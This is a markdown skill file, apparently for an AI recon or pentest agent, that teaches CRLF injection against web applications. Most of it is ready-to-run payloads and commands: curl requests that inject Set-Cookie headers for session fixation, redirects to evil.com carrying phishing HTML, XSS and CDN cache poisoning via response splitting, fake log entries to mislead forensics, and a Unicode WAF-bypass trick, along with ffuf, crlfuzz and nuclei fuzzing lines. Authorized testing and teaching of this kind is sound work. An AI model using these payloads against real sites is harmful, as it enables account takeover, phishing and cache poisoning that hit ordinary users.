<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: crlf-injection
description: CRLF injection — HTTP header injection, response splitting, session fixation via Set-Cookie injection, log injection, and open redirect via Location header manipulation
---

# CRLF Injection

CRLF = Carriage Return `\r` (0x0D) + Line Feed `\n` (0x0A). Injecting these into HTTP headers breaks response parsing → inject arbitrary headers, split responses, set cookies, achieve XSS.

---

## Detection

    # Inject CRLF via URL parameter that appears in response headers (e.g., Location, Set-Cookie):
    curl -v "http://target.com/redirect?url=https://example.com%0d%0aSet-Cookie:crlf=injected"
    # If response contains: Set-Cookie: crlf=injected → vulnerable

    # Encodings to try:
    %0d%0a          # Standard URL encoding (\r\n)
    %0a             # Just \n (sometimes sufficient)
    %0d             # Just \r (rare)
    %E5%98%8A%E5%98%8D   # Unicode alternative (%E5%98%8A = \n, %E5%98%8D = \r)
    %E5%98%8A       # Unicode \n
    \r\n            # Literal (if not URL-decoded)
    \n              # Just newline

    # In path:
    curl -v "http://target.com/%0d%0aSet-Cookie:session=attacker"

    # In User-Agent (if reflected in logs or headers):
    curl -H "User-Agent: test%0d%0aSet-Cookie:session=attacker" http://target.com/

---

## Session Fixation via Set-Cookie Injection

    # Inject Set-Cookie header:
    http://target.com/login?redirect=%0d%0aSet-Cookie:SESSIONID=attacker_controlled_value;HttpOnly=false
    # → Response includes: Set-Cookie: SESSIONID=attacker_controlled_value

    # Victim visits crafted URL → browser sets attacker's session ID
    # Attacker logs in with same session ID → session fixation → account takeover

---

## Open Redirect via Location Header

    # If redirect parameter reflected in Location header:
    curl -v "http://target.com/redirect?url=https://evil.com%0d%0aFoo:Bar"
    # Response: Location: https://evil.com\r\nFoo: Bar

    # Full redirect to attacker:
    curl -v "http://target.com/redirect?url=https://evil.com%0d%0a%0d%0a<html>phishing"

---

## XSS via Response Splitting

    # Inject complete second HTTP response:
    # Parameter reflected in Location/redirect header:
    http://target.com/redirect?url=%0d%0a%0d%0a<script>alert(document.cookie)</script>

    # Inject Content-Type to enable XSS in JSON response:
    curl "http://target.com/api?callback=foo%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>"

---

## Log Injection

    # If user input logged (User-Agent, Referer, username):
    curl -H "User-Agent: normaluser\n[CRITICAL] Admin login successful: admin:password123" http://target.com/
    # Injects fake log entries → confuse forensics, hide real attack

    # Combined with log viewer XSS:
    curl -H "User-Agent: <script>alert('xss')</script>" http://target.com/
    # If admin views logs in browser → XSS

---

## HTTP Response Splitting (Full)

Inject two complete responses to poison caches or CDNs:

    # Payload:
    GET /redirect?url=https://example.com%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:36%0d%0a%0d%0a<script>alert('cache-poisoned')</script> HTTP/1.1
    Host: target.com

    # If proxy caches the poisoned second response → all users get XSS

---

## Testing Locations for CRLF

    # 1. Redirect parameters:
    /redirect?url=INJECT
    /redirect?next=INJECT
    /redirect?return=INJECT
    /redirect?returnUrl=INJECT
    /redirect?goto=INJECT

    # 2. Cookie parameters:
    /login?sessionid=INJECT

    # 3. Path-based:
    /INJECT/page

    # 4. Headers reflected in response:
    User-Agent, Referer, X-Forwarded-For (if logged/reflected)

    # Quick test all redirect params:
    ffuf -u "http://target.com/redirect?FUZZ=test%0d%0aSet-Cookie:crlf=1" \
      -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
      -H "Content-Type: application/x-www-form-urlencoded" -mc all \
      -fr "Set-Cookie: crlf=1"  # Match if injected header appears

---

## Automated Tools

    # crlfuzz:
    # go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
    crlfuzz -u "http://target.com/" -v

    # nuclei:
    nuclei -t http/vulnerabilities/generic/crlf-injection.yaml -u http://target.com/

    # Manual ffuf parameter discovery:
    ffuf -u "http://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
      -H "Test: val%0d%0aInjected:yes" -mr "Injected:"

---

## Pro Tips

1. CRLF in `Location` header redirect is extremely common — test ALL redirect endpoints
2. `Set-Cookie` injection without `HttpOnly` flag → steal cookies from other users (combined with CORS)
3. Try both `%0d%0a` and `%0a` — some servers only strip one form
4. Unicode encoding `%E5%98%8A%E5%98%8D` bypasses many WAFs that only filter ASCII CRLF
5. Response splitting = cache poisoning on CDNs → amplified XSS affecting all users
6. Log injection is often P4 but can be upgraded with log viewer XSS → P2/P1

## Summary

CRLF testing: inject `%0d%0aSet-Cookie:test=1` in redirect parameters → check response headers for `Set-Cookie: test=1`. Also test `Location` header injection and `%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>` for XSS. `crlfuzz` automates parameter discovery. Session fixation via cookie injection = high-severity ATO chain.
